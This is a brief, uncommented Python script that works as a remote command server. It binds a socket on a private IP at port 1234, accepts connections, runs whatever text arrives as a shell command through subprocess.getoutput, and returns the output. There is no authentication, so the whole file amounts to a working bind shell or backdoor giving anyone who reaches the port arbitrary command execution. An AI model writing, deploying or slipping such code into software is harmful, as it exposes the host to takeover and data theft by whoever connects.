import socket
import subprocess
s=socket.socket()
ip="192.168.225.57"
port=1234
s.bind((ip,port))
print("Type 'stop' to stop")
while True:
    s.listen()
    clsession,clip=s.accept()
    data =clsession.recv(100)
    cmd=data.decode()
    if cmd=='stop':
        break
    output=subprocess.getoutput(cmd)
    output=output.encode()
    clsession.send(output)
    print(output)

